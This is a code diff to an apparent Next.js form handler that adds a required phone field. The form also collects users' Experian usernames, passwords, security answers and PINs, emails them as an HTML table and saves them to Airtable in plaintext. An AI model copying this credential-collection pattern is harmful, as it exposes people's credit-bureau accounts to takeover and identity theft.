@@ -30,6 +30,7 @@ export async function POST(request: Request) {
     const {
       fullName,
       email,
+      phone,
       referredBy,
       experianUsername,
       experianPassword,
@@ -37,7 +38,7 @@ export async function POST(request: Request) {
       experianPin,
     } = body;
 
-    if (!fullName || !email || !experianUsername || !experianPassword || !experianSecurityAnswer || !experianPin) {
+    if (!fullName || !email || !phone || !experianUsername || !experianPassword || !experianSecurityAnswer || !experianPin) {
       return NextResponse.json({ error: "Incomplete form data" }, { status: 400 });
     }
 
@@ -56,7 +57,8 @@ export async function POST(request: Request) {
         <table style="width:100%;border-collapse:collapse;font-size:14px;">
           ${row("Full Name", fullName, true)}
           ${row("Email", email)}
-          ${row("Referred By", referredBy || "—", true)}
+          ${row("Phone", phone, true)}
+          ${row("Referred By", referredBy || "—")}
           ${row("Experian Username", experianUsername)}
           ${row("Experian Password", experianPassword, true)}
           ${row("Security Answer", experianSecurityAnswer)}
@@ -104,6 +106,7 @@ export async function POST(request: Request) {
       saveToAirtable({
         "Full Name": fullName,
         "Email": email,
+        "Phone": phone,
         "Referred By": referredBy || "",
         "Experian Username": experianUsername,
         "Experian Password": experianPassword,
